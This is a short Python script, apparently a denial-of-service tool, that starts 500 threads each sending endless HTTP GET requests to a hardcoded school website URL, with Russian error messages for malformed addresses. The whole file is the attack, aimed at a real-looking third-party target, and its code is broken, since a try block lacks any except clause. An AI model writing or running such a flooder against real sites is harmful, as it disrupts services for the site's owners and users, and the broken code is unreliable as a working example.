import threading
import requests

def dos(target):
    while True:
        try:
            res = requests.get(target)
threads = 500

url = "http://school152-krs.ru/"

if not url.__contains__("http"):
    exit("Неправильный адрес сайта!")

if not url.__contains__("."):
    exit("Неправильный домен")

for i in range(0, threads):
    thr = threading.Thread(target=dos, args=(url,))
    thr.start()
